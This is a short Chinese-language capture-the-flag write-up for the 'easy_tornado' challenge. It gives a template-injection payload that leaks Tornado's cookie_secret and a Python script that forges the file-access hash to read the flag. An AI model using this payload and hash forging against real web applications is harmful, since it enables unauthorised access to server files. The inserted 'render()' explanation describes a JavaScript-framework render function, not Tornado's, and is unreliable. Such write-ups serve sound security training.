---
title: [护网杯2018]easy_tornado
date: 2020-05-10 08:45:22
tags: Web
---

# **[护网杯 2018]easy_tornado**

都打开看看

> /flag. txt
> flag in/flllllllag

>  /welcome. txt
>  render  

>   /hints. txt
>   md5(cookie_secret+md5(filename) )

**render()函数详解**

>  1.**render方法的实质就是生成 itemplate模板**
>  2.通过调用一个方法来生成，而这个方法是通过 render方法的参数传递给它的
>  3.这个方法有三个参数，分别提供标签名，标签相关属性，标签内部的htm内容
>  4.通过这三个参数，可以生成一个完整的木模板
>
>  tips：
>
>  > 1、render方法可以使用SX语法，但需要 Babel plugin插件
>  > 2、 render方法里的第三个参数可以使用函数来生成多个组件（特别是如果他们相同的话），只要生成结果是一个数组，且数组元素都是vNode即可  

通过这种方式在网页上显示

render 标志着**模板注入**

> render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页 render配合Tornado使用

 测试一下

> /error?msg={ {1*2} }

经过测试发现过滤

payload:

> /error?msg={ {handler.settings} }

拿到 cookie_secret 解密

```python
import hashlib
hash = hashlib.md5()

filename='/fllllllllllllag'
cookie_secret="8b1de274-3078-4412-a8c4-a6835eeda4a1"
hash.update(filename.encode('utf-8'))
s1=hash.hexdigest()
hash = hashlib.md5()
hash.update((cookie_secret+s1).encode('utf-8'))
print(hash.hexdigest())
```

得到flag

**拓展**:

```python
#生成 Tornado 所需的 cookie_secret 的办法
import base64
import uuid

base64.b64encode(uuid.uuid4().bytes + uuid.uuid4().bytes)
```

